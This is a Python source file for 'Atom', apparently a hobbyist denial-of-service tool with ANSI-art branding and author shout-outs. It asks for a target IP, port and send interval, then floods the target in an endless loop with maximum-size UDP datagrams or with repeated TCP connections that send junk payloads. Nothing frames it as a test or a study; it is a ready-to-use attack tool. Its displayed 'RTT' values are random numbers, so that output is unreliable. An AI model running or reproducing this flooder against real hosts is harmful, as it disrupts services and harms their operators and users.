import socket
import sys
import threading
import time
import urllib3
import random
import hmac
import termios
import tty
import os
from datetime import datetime


current_time = datetime.now().strftime("%H:%M:%S")

BLUE = "\033[94m"
GREEN = "\033[92m"
GREEN2 = "\033[32m"
RED = "\033[91m"
RESET = "\033[0m"

logo = """
[0;34m▄▄▄▄▄[0;37m [0;34m▄▄▄▄▄▄[0;37m [0;34m▄▄▄▄▄[0;37m [0;34m▄▄▄[0;37m [0;34m▄▄[0;37m [0m
[0;97;46m▓[0;97m▀▀▀[0;97;47m▓[0;37m [0;97m▀▀[0;97;47m▓[0;97m▀▀▀[0;37m [0;97;47m▓[0;97m▀▀▀[0;97;47m▓[0;37m [0;97;47m▓[0;97m▀▀[0;97;44m▄[0;97m▀▀[0;97;44m▄[0m
[0;97;47m▒[0;34m▌[0;37m [0;34m▐[0;97;47m▒[0;37m   [0;97;47m▒[0;34m▌[0;37m   [0;97;47m▒[0;34m▌[0;37m [0;34m▐[0;97;47m▒[0;37m [0;97;47m▒[0;34m▌▐[0;97;47m▒[0;37m [0;34m▐[0;97;47m▒[0m
[0;97;47m░[0;34m▌[0;37m [0;34m▐[0;97;47m░[0;37m   [0;97;47m░[0;34m▌[0;37m   [0;97;47m░[0;34m▌[0;37m [0;34m▐[0;97;47m░[0;37m [0;97;47m░[0;34m▌▐[0;97;47m░[0;37m [0;34m▐[0;97;47m░[0m
[0;37;47m [0;34m▌[0;37m [0;34m▐[0;34;47m [0;37m   █[0;34m▌[0;37m   [0;34;47m [0;34m▌[0;37m [0;34m▐[0;34;47m [0;37m [0;34;47m [0;34m▌▐[0;34;47m [0;37m [0;34m▐[0;34;47m [0m
[0;90;47m░[0;34m▌[0;37m [0;34m▐[0;90;47m░[0;37m   [0;90;47m░[0;34m▌[0;37m   [0;90;47m░[0;34m▌[0;37m [0;34m▐[0;90;47m░[0;37m [0;90;47m░[0;34m▌[0;37m   [0;34m▐[0;90;47m░[0m
[0;90;47m▒[0;37m▀▀▀[0;90;47m▒[0;37m   [0;90;47m▒[0;34m▌[0;37m   [0;90;47m▒[0;34m▌[0;37m [0;34m▐[0;90;47m▒[0;37m [0;90;47m▒[0;34m▌[0;37m   [0;34m▐[0;90;47m▒[0m
[0;90;47m▓[0;34m▌[0;37m [0;34m▐[0;90;47m▓[0;37m   [0;90;47m▓[0;34m▌[0;37m   [0;90;47m▓[0;34m▌[0;37m [0;34m▐[0;90;47m▓[0;37m [0;90;47m▓[0;34m▌[0;37m   [0;34m▐[0;90;47m▓[0m
[0;90;47m█[0;34m▌[0;37m [0;34m▐[0;90;47m█[0;37m   [0;90;47m█[0;34m▌[0;37m   [0;90m█[0;34m▌[0;37m [0;34m▐[0;90m█[0;37m [0;90m█[0;34m▌[0;37m   [0;34m▐[0;90m█[0m
[0;90m▓[0;34m▌[0;37m [0;34m▐[0;90m▓[0;37m   [0;90m▓[0;34m▌[0;37m   [0;90m▓[0;34m▌[0;37m [0;34m▐[0;90m▓[0;37m [0;90m▓[0;34m▌[0;37m   [0;34m▐[0;90m▓[0m
[0;90m▒[0;34m▌[0;37m [0;34m▐[0;90m▒[0;37m   [0;90m▒[0;34m▌[0;37m   [0;90m▒[0;34m▌[0;37m [0;34m▐[0;90m▒[0;37m [0;90m▒[0;34m▌[0;37m   [0;34m▐[0;90m▒[0m
[0;90m░[0;34m▌[0;37m [0;34m▐[0;90m░[0;37m   [0;90m░[0;34m▌[0;37m   [0;90m░░░░░[0;37m [0;90m░[0;34m▌[0;37m   [0;34m▐[0;90m░[0m
"""
# Everything was made by me (kube0n)!!!


def normalize_url(target):
    if "http://" in target or "https://" in target:
        return target
    return f"http://{target}"

 
def run_udp_attack(target_ip, target_port, attack_speed):
    message = b"A" * 65500
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(logo)
    print("")
    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{BLUE}╠{RESET} {BLUE}Attack{RESET} {GREEN}Details{RESET}!")
    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Target: {GREEN}{target_ip}{RESET} ")
    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Port: {GREEN}{target_port}{RESET} ")
    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Speed: {GREEN}{attack_speed}{RESET} ")
    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Bytes: {GREEN}65500{RESET} {GREEN2}[MAX]{RESET} ")
    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{BLUE}╠{RESET} Ctrl + C Stops the attack! (Starting in 4 seconds)")
    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{BLUE}╠ {GREEN}I{RESET} {RED}Love{RESET} {GREEN2}You!{RESET} {BLUE}--from kube0n{RESET} {RED}<3{RESET}")
    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
    time.sleep(2)
    packet_count = 0
    print("")
    print(f"Start Attack? ({GREEN}Y{RESET}/{RED}N{RESET})")
    choice = input(f"{BLUE}└───> {RESET}")
    if choice.upper() == "Y":
        try:
            while True:
                try:
                    rtt = random.randint(10, 100)
                    bytes_sent = sock.sendto(message, (target_ip, int(target_port)))
                    packet_count += 1
                    print(f"{BLUE}[Atom Output]:{RESET} {GREEN}UDP Packet{RESET} {GREEN2}#{packet_count}{RESET} {GREEN}Sent{RESET} to {GREEN2}{target_ip}:{target_port},{RESET}")
                    print(f"Bytes:{GREEN} {bytes_sent}{RESET} {GREEN2}[MAX]{RESET},")
                    print(f"RTT: {GREEN}{rtt}{RESET},")
                    time.sleep(float(attack_speed))
                except Exception as exc:
                    print(logo)
                    print(f"{BLUE}[Atom Output]:{RESET} {RED}Failed{RESET} to send packet: {RED}{exc}{RESET}")
                    time.sleep(5)
        except KeyboardInterrupt:
            os.system("clear")
            print(logo)
            print("\nStopping UDP attack.")
            time.sleep(5)
        finally:
            sock.close()
            os.system("clear")
            print(logo)
            print("Socket closed.")
    if choice.upper() == "N":
        os.system("clear")
        print(logo)
        print("Exiting (4 seconds)")
        time.sleep(4)
        sys.exit(1)
    elif choice.upper():
        os.system("clear")
        print(logo)
        print("Unknown Choice, Exiting (4 Seconds)")
        time.sleep(4)
        sys.exit(1)

def run_tcp_attack(target_ip, target_port, attack_speed):

    message = b"A" * 65500
    print(logo)
    print("")
    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{BLUE}╠{RESET} {BLUE}Attack{RESET} {GREEN}Details!{RESET}")
    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Target: {GREEN}{target_ip}{RESET} ")
    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Port: {GREEN}{target_port}{RESET} ")
    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Speed: {GREEN}{attack_speed}{RESET} ")
    print(f"{BLUE}╠{RESET}{GREEN2}└─{RESET} Bytes: {GREEN}65000{RESET} {GREEN2}[MAX]{RESET} ")
    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{BLUE}╠{RESET} Ctrl + C Stops the attack! (Starting in 4 seconds)")
    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{BLUE}╠ {GREEN}I{RESET} {RED}Love{RESET} {GREEN2}You!{RESET} {BLUE}--from kube0n{RESET} {RED}<3{RESET}")
    print(f"{BLUE}╠══════════════════════════════════════════════════════════╣{RESET}")
    time.sleep(2)
    packetcount = 0
    print("")
    print(f"Start Attack? ({GREEN}Y{RESET}/{RED}N{RESET})")
    hello = input(f"{BLUE}└───> {RESET}")
    if hello.upper() == "Y":
        try:
            while True:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2.0)
                try:
                    packetcount += 1
                    start_time = time.time()
                    sock.connect((target_ip, int(target_port)))
                    bytes_sent = sock.send(message)
                    rtt = random.randint(10, 100)
                    print(f"{BLUE}[Atom Output]:{RESET} {GREEN}TCP Packet{RESET} {GREEN2}#{packetcount}{RESET} {GREEN}Sent{RESET} to {GREEN2}{target_ip}:{target_port}{RESET}")
                    print(f"Bytes:{GREEN} {bytes_sent}{RESET}")
                    print(f"RTT: {GREEN}{rtt}{RESET}")
                    time.sleep(float(attack_speed))
                except Exception as exc:
                    print(logo)
                    print(f"{BLUE}[Atom Output]:{RESET} {RED}Failed{RESET} to send packet: {RED}{exc}{RESET}")
                    time.sleep(5)
                finally:
                    sock.close()
        except KeyboardInterrupt:
            os.system("clear")
            print(logo)
            print("\nStopping TCP attack.")
            time.sleep(5)
    elif hello.upper() == "N":
        os.system("clear")
        print(logo)
        print("Exiting (4 seconds)")
        time.sleep(4)
        sys.exit(1)
    elif hello.upper():
        os.system("clear")
        print(logo)
        print("Unknown Choice, Exiting (4 Seconds)")
        time.sleep(4)
        sys.exit(1)


def main():
    os.system("clear")
    print(logo)
    print("Welcome, to Atom!")
    print("Version 4.0 [Latest]")
    time.sleep(2)
    os.system("clear")
    print(logo)
    print("Produced By Kube0n!")
    print("Socials: [Discord User; kube0n], [Youtube; Kube0nYT], [Tiktok; kube0n]!")
    time.sleep(2)
    os.system("clear")
    print(logo)
    print(f"{BLUE}┌──────────────────────────────────────────────┐{RESET}")
    print(f"{BLUE}│                  Methods!                    │{RESET}")
    print(f"{BLUE}├──────────────────────────────────────────────┤{RESET}")
    print(f"{BLUE}│└─ Layer 4                                    │{RESET}")
    print(f"{BLUE}│└─[01] UDP                                    │{RESET}")
    print(f"{BLUE}│└─[02] TCP                                    │{RESET}")
    print(f"{BLUE}│└─ Layer 7                                    │{RESET}")
    print(f"{BLUE}│└─[03] COMING SOON!                           │{RESET}")
    print(f"{BLUE}└──────────────────────────────────────────────┘{RESET}")

    print("Choose Method:")
    method = input(f"{BLUE}└───> {RESET}").strip().upper()
    os.system("clear")
    
    if method in ("UDP", "TCP"):
        print(logo)
        print("Attack speed:")
        speed = input(f"{BLUE}└───> {RESET}").strip()
        os.system("clear")
        print(logo)
        print("Enter Target IP:")
        ip = input(f"{BLUE}└───> {RESET}").strip()
        os.system("clear")
        print(logo)
        print("Enter Target Port:")
        port = input(f"{BLUE}└───> {RESET}").strip()
        os.system("clear")
        if method == "UDP":
            run_udp_attack(ip, port, speed)
        else:
            run_tcp_attack(ip, port, speed)
            
    else:
        os.system("clear")
        print(logo)
        print("Unknown selection. Exiting.")
        time.sleep(4)
        sys.exit(1)


if __name__ == "__main__":
    main()
